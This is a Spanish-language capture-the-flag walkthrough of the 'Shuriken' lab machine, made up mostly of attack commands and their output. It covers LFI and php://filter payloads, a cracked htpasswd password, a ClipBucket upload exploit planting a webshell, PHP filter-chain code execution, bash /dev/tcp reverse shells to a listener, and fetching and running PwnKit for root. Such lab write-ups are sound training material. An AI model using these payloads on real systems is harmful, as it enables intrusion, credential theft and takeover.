PORT   STATE SERVICE
80/tcp open  http

-Hacemos Fuzzing y encontramos la siguiente ruta:
	-/js

-Hay dos archivos .js , los descargamos con wget e inspeccionamos el código:
	-En el archivo 'index__d8338055.js', encontramos esto:
		-http://shuriken.local/index.php?referer=

-Añadimos shuriken.local al /etc/hosts y probamos un LFI en la URL:
	-http://shuriken.local/index.php?referer=
		-VEMOS EL /ETC/PASSWD!!!
		(En la web no se ve, pero en el Código Fuente si!!)

-Probamos a enumerar los Logs de Apache y SSH, SIN ÉXITO

-Aplicamos Wrappers y vemos que funcionan:
	-Base64:
		 -http://shuriken.local/index.php?referer=php://filter/convert.base64-encode/resource=index.php
		 **(FUNCIONA)**
	-Utf-8: 
		-http://shuriken.local/index.php?referer=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
		**(FUNCIONA)**

## Ganar acceso a la máquina (2 ways)

### 1-Archivo de Configuración Apache (000-default.conf)

-Archivo de configuración de Apache que puede contener información sensible

-Por defecto está en:
	-/etc/apache2/sites-enabled/000-default.conf

-Ejemplo de explotación a través de LFI:
	-Curl -s -X GET 'http://shuriken.local/index.php?referer=/etc/apache2/sites-enabled/000-default.conf'
		AuthUserFile /etc/apache2/.htpasswd
		(Ruta dónde se almacena una Contraseña!!)

-Listamos la ruta dónde está la posible contraseña, a través del LFI:
	-curl -s -X GET 'http://shuriken.local/index.php?referer=/etc/apache2/.htpasswd'
		**developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0**
		(HEMOS ENCONTRADO UN USUARIO Y SU HASH!!!)

-Rompemos el hash:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		9972761drmfsls      (?) 

-Miramos el otro archivo .js que obtuvimos al principio y nos encontramos un subdominio, lo añadimos al /etc/hosts y vemos que es un Panel de Login, probamos con las credenciales:
	-http://broadcast.shuriken.local/
		-Username: developers
		-Password: 9972761drmfsls

-Entramos a un CMS llamado ClipBucket con la Versión 4.0, buscamos exploits y encontramos:
	-**Exploit CMS ClipBucket 4.0 - File Upload**
	-Nos clonamos el siguiente repo:
		https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload/tree/main
	-Aportamos credenciales y el exploit sube una webshell:
		-python3 exploit.py broadcast.shuriken.local developers 9972761drmfsls
			[+] Example Run Shell: http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1746453867b7ab1e.php?cmd=whoami
				www-data 
	-Con la webshell subida, nos mandamos una RS:
		http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1746453867b7ab1e.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.136/1234 0>%261'
			www-data@shuriken:/$ whoami
				www-data

### 2-LFI to RCE vía Filters Chain

-Cómo los Wrappers funcionan. es probable que podamos Ejecutar Comandos mediante **Filters Chain**:
	-Generamos Payload:
		-python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>  "
			(Nos genera un Payload MUY LARGO)
	-Lo introducimos en la URL a través del LFI:
		-http://shuriken.local/index.php?referer=php://filter/convert.iconv.UTF8.CSISO2022KR| ....... (Resto del Payload)
			**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
			(Funciona!! , se ha ejecutado el comandooo!!)

-Generamos una webshell y nos mandamos una RS mediante el LFI:
	-Generamos webshell:
		![[Pasted image 20250505131447.png]]
	-Nos mandamos una RS con el Payload generado de la webshell, desde la URL:
		-Payload_Largo=php://temp&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
			www-data@shuriken:/$ whoami
				www-data


## Escalada de Privilegios

-Listamos binarios con privilegios SUID y encontramos:
	-/usr/bin/pkexec

-Lo explotamos para escalar a root:
	-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
	-./PwnKit 
		root@shuriken:/tmp# whoami
			root


